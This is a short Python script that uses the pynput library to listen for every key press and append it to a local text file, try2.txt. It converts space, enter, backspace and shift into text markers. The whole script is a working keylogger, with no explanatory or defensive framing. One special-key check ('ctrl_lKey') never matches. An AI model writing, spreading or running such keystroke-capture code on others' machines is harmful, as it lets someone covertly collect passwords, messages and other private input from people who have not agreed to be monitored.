from pynput.keyboard import Key, Listener

def writefilee(key):
    keydata= str(key)
    keydata= keydata.replace("'","")
    
    if keydata== 'Key.space':
        keydata='  '
    elif keydata == 'Key.backspace':
        keydata=('\nback space')
    elif keydata == 'Key.enter':
        keydata=('\n') 
    elif keydata == 'Key.shift':
        keydata=('\n ') 
    elif keydata == 'ctrl_lKey':
        keydata=('\n ') 
    else:
        keydata=keydata


    with open('try2.txt','a') as f:
            f.write(keydata)


with Listener(on_press=writefilee) as d :
    d.join()
